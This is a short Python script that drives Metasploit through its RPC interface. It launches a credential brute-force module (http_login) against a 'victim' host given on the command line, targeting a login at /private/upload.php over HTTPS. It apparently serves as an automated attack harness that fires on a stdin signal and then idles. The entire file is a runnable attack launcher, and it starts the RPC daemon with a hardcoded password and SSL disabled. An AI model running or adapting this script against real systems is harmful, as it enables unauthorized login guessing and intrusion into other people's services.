import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient
import time

if __name__ == '__main__':
    os.system("./msfrpcd -P password -S")

    victim = sys.argv[1]

    print("INITIALIZING EXPLOIT")

    # connect to Metasploit exploit Server
    while True:
        try:
            client = MsfRpcClient('password', port=55553, ssl=False)
            print("CONNECTED TO MSFRPC")
            break
        except:
            time.sleep(1)

    # metasploit settings
    exploit = client.modules.use('auxiliary', 'scanner/http/http_login')
    exploit['AUTH_URI'] = '/private/upload.php'
    exploit['RHOSTS'] = victim
    exploit['RPORT'] = 443
    exploit['SSL'] = True
    exploit['VERBOSE'] = False

    cid = client.consoles.console().cid

    # execute exploit after receiving Stdin line
    sys.stdin.readline()
    print(client.consoles.console(cid).run_module_with_output(exploit, None, True))
    client.jobs.stop(0)

    print("EXPLOIT EXECUTED")
    while True:
        print("sleeping...")
        time.sleep(1)
